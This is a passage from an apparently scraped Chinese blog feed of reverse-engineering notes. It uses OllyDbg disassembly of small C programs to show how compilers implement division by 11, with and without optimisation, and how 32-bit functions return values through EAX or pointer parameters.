data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>	 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="整数的除法"><a class="anchor" href="#整数的除法">#</a> 整数的除法</h2>
<h3 id="未优化"><a class="anchor" href="#未优化">#</a> 未优化</h3>
<p>OD 进入主函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220401185731025.png" alt="image-20220401185731025" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP                                 <span class="token punctuation">;</span>  保存环境</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401001</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP                              <span class="token punctuation">;</span>  修改栈指针位置</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401003</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">51</span>            PUSH ECX                                 <span class="token punctuation">;</span>  sub esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401004</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D45 FC       LEA EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  局部变量的地址给eax，ebp <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">=</span> temp<span class="token punctuation">,</span>eax <span class="token operator">=</span> <span class="token operator">&amp;</span>temp</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00401007</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX                                 <span class="token punctuation">;</span>  <span class="token operator">&amp;</span>temp</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00401008</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">30804000</span>   PUSH 没优化<span class="token number">.00408030</span>                        <span class="token punctuation">;</span>  ASCII <span class="token string">"%d"</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0040100</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">53000000</span>   CALL 没优化<span class="token number">.00401065</span>                        <span class="token punctuation">;</span>  scanf</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401012</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">8</span>                                <span class="token punctuation">;</span>  平栈</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401015</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 FC       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  eax <span class="token operator">=</span> temp<span class="token punctuation">;</span>eax <span class="token operator">=</span> 外部输入的值</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00401018</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">99</span>            CDQ                                      <span class="token punctuation">;</span>  cdq符号扩展指令</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00401019</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  B9 <span class="token number">0</span>B000000   MOV ECX<span class="token punctuation">,</span><span class="token number">0</span>B                               <span class="token punctuation">;</span>  被除数 ecx <span class="token operator">=</span> <span class="token number">0</span>b <span class="token operator">=</span> <span class="token number">11</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">0040101</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  F7F9          IDIV ECX                                 <span class="token punctuation">;</span>  idiv除法指令 除数，商eax 余数edx</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00401020</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">00401021</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">34804000</span>   PUSH 没优化<span class="token number">.00408034</span>                        <span class="token punctuation">;</span>  ASCII <span class="token string">"%d "</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">00401026</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">09000000</span>   CALL 没优化<span class="token number">.00401034</span>                        <span class="token punctuation">;</span>  printf</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">0040102</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token number">0040102</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token number">00401030</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BE5          MOV ESP<span class="token punctuation">,</span>EBP</pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token number">00401032</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token number">00401033</span>  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220401190950033.png" alt="image-20220401190950033" /></p>
<h3 id="优化"><a class="anchor" href="#优化">#</a> 优化</h3>
<p>OD 进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220401190921099.png" alt="image-20220401190921099" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">51</span>            PUSH ECX                                 <span class="token punctuation">;</span>  sub eap<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401001</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D4424 <span class="token number">00</span>     LEA EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token punctuation">]</span>               <span class="token punctuation">;</span>  temp eax <span class="token operator">=</span> <span class="token operator">&amp;</span>temp</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401005</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX                                 <span class="token punctuation">;</span>  <span class="token operator">&amp;</span>temp</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401006</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">34804000</span>   PUSH 优化<span class="token number">.00408034</span>                         <span class="token punctuation">;</span>  ASCII <span class="token string">"%d"</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040100</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">61000000</span>   CALL 优化<span class="token number">.00401071</span>                         <span class="token punctuation">;</span>  scanf</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00401010</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B4C24 <span class="token number">08</span>     MOV ECX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  ecx <span class="token operator">=</span> 输入的参数</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00401014</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  B8 E9A28B2E   MOV EAX<span class="token punctuation">,</span><span class="token number">2E8</span>BA2E9                         <span class="token punctuation">;</span>  eax 编译器生成</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401019</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  F7E9          IMUL ECX                                 <span class="token punctuation">;</span>  ecx <span class="token operator">=</span> eax <span class="token operator">=</span> <span class="token number">2e8</span>ba2e9</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">0040101</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  D1FA          SAR EDX<span class="token punctuation">,</span><span class="token number">1</span>                                <span class="token punctuation">;</span>  右移 <span class="token number">32</span> <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">0040101</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BCA          MOV ECX<span class="token punctuation">,</span>EDX                              <span class="token punctuation">;</span>  将结果放入ecx</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">0040101F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  C1E9 <span class="token number">1F</span>       SHR ECX<span class="token punctuation">,</span><span class="token number">1F</span>                               <span class="token punctuation">;</span>  右移 <span class="token number">31</span> 位</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">00401022</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">03</span>D1          ADD EDX<span class="token punctuation">,</span>ECX                              <span class="token punctuation">;</span>  如果符号位为负数 <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00401024</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">52</span>            PUSH EDX</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">00401025</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">30804000</span>   PUSH 优化<span class="token number">.00408030</span>                         <span class="token punctuation">;</span>  ASCII <span class="token string">"%d "</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">0040102</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">11000000</span>   CALL 优化<span class="token number">.00401040</span>                         <span class="token punctuation">;</span>  printf</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">0040102F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token number">00401031</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">14</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">14</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token number">00401034</span>  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220401191405519.png" alt="image-20220401191405519" /></p>
<p>函数分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401014</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  B8 E9A28B2E   MOV EAX<span class="token punctuation">,</span><span class="token number">2E8</span>BA2E9                         <span class="token punctuation">;</span>  eax 编译器生成</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401019</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  F7E9          IMUL ECX                                 <span class="token punctuation">;</span>  ecx <span class="token operator">=</span> eax <span class="token operator">=</span> <span class="token number">2e8</span>ba2e9</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">0040101</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  D1FA          SAR EDX<span class="token punctuation">,</span><span class="token number">1</span>                                <span class="token punctuation">;</span>  右移 <span class="token number">32</span> <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr></table></figure><p>效果如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>eax <span class="token operator">=</span> <span class="token number">2e8</span>ba2e9</pre></td></tr><tr><td data-num="2"></td><td><pre>ecx <span class="token operator">=</span> ecx <span class="token operator">*</span> eax</pre></td></tr><tr><td data-num="3"></td><td><pre>edx <span class="token operator">=</span> <span class="token punctuation">(</span>ecx <span class="token operator">*</span> eax<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span>ecx <span class="token operator">*</span> eax<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">=</span><span class="token operator">></span> ecx <span class="token operator">*</span> <span class="token number">0.09</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">=</span><span class="token operator">></span> ecx <span class="token operator">/</span> <span class="token number">11</span></pre></td></tr></table></figure><p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token keyword">int</span> a<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	 <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> a<span class="token operator">/</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>	 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程之32位返回值的俩种方式</title>
    <url>/article/c3ac3ffb.html</url>
    <content><![CDATA[<h2 id="用return操作符返回值"><a class="anchor" href="#用return操作符返回值">#</a> 用 return 操作符返回值</h2>
<p>返回就是把函数执行结果返回到外界，到上一层函数中调用</p>
<p>示例：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">main</span><span class="token punctuation">(</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>		<span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	 	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token keyword">int</span> temp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	temp<span class="token operator">=</span>x<span class="token operator">+</span>y<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">return</span> temp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>OD 打开进入函数模块</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328193440777.png" alt="image-20220328193440777" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401003</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">6</span>A <span class="token number">06</span>         PUSH <span class="token number">6</span>                                   <span class="token punctuation">;</span> <span class="token operator">/</span>Arg2 <span class="token operator">=</span> <span class="token number">00000006</span>   压入第二个参数 ebp <span class="token operator">+</span> c</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401005</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">6</span>A <span class="token number">05</span>         PUSH <span class="token number">5</span>                                   <span class="token punctuation">;</span> <span class="token operator">|</span>Arg1 <span class="token operator">=</span> <span class="token number">00000005</span>   压入第一个参数 ebp <span class="token operator">+</span> <span class="token number">8</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401007</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">07000000</span>   CALL add<span class="token punctuation">.</span><span class="token number">00401013</span>                        <span class="token punctuation">;</span> \add<span class="token punctuation">.</span><span class="token number">00401013</span></pre></td></tr><tr><td data-num="4"></td><td><pre>加法</pre></td></tr></table></figure><p>进入 add 函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328194328950.png" alt="image-20220328194328950" /></p>
<p>分析如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401013</span>  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP                                 <span class="token punctuation">;</span>  保存环境</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401014</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401016</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">51</span>            PUSH ECX</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401017</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 <span class="token number">08</span>       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  eax <span class="token operator">=</span> ebp <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">;</span> eax <span class="token operator">=</span> <span class="token number">5</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040101</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> <span class="token number">0</span>C       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span>C<span class="token punctuation">]</span>             <span class="token punctuation">;</span>  eax <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>ebp <span class="token operator">+</span> c <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span> <span class="token number">5</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">;</span> eax <span class="token operator">=</span> <span class="token number">11</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0040101</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8945</span> FC       MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>EAX             <span class="token punctuation">;</span>  eax放到一个局部变量 temp <span class="token operator">=</span> x <span class="token operator">+</span> y</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00401020</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 FC       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  eax <span class="token operator">=</span> temp返回，要把返回值放到eax中，便于返回</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401023</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BE5          MOV ESP<span class="token punctuation">,</span>EBP</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401025</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00401026</span>  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328194639406.png" alt="image-20220328194639406" /></p>
<h2 id="通过参数按传引用方式返回值"><a class="anchor" href="#通过参数按传引用方式返回值">#</a> 通过参数按传引用方式返回值</h2>
<p>示例：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">void</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">main</span><span class="token punctuation">(</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token operator">&amp;</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a、b中较大的数是%d"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将最大的数显示出来</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">void</span> <span class="token function">max</span><span class="token punctuation">(</span> <span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>b<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>a <span class="token operator">&lt;</span> <span class="token operator">*</span>b<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>		<span class="token operator">*</span>a<span class="token operator">=</span><span class="token operator">*</span>b<span class="token punctuation">;</span> 		<span class="token comment">// 经比较后，将较大的数放到 a 变量之中</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">//a = 值</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token comment">//&amp;a = 地址</span></pre></td></tr></table></figure><p>示例分析：</p>
<p>通过取地址符 &quot;&amp;&quot;，传入两个地址</p>
<p>再通过 &quot;*&quot; 取值，进行比较</p>
<p>OD 分析：</p>
<p>找到入口进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328195438905.png" alt="image-20220328195438905" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220328195448560.png" alt="image-20220328195448560" /></p>
<p>分析结果：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">83</span>EC <span class="token number">08</span>       SUB ESP<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401003</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D4424 <span class="token number">04</span>     LEA EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  第二个指针，将地址放入eax</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401007</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D4C24 <span class="token number">00</span>     LEA ECX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token punctuation">]</span>               <span class="token punctuation">;</span>  第一个指针，将地址放入ecx</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">0040100</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX                                 <span class="token punctuation">;</span>  将指针二的地址压栈，ebp <span class="token operator">+</span> c</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040100</span>C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">51</span>            PUSH ECX                                 <span class="token punctuation">;</span>  将指针一的地址压栈<span class="token punctuation">,</span>ebp <span class="token operator">+</span> <span class="token number">8</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0040100</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  C74424 <span class="token number">08</span> <span class="token number">050</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">5</span>               <span class="token punctuation">;</span>  <span class="token operator">*</span>指针一 <span class="token operator">=</span> <span class="token number">5</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00401015</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  C74424 <span class="token number">0</span>C <span class="token number">060</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span>C<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">6</span>               <span class="token punctuation">;</span>  <span class="token operator">*</span>指针二 <span class="token operator">=</span> <span class="token number">6</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0040101</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">1E000000</span>   CALL <span class="token keyword">return</span><span class="token number">.00401040</span>                     <span class="token punctuation">;</span>  调用的函数，取最大值的功能call</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401022</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B5424 <span class="token number">08</span>     MOV EDX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  esp <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">=</span> a，edx <span class="token operator">=</span> a</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00401026</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">52</span>            PUSH EDX                                 <span class="token punctuation">;</span>  a的值压入栈中</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00401027</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">30704000</span>   PUSH <span class="token 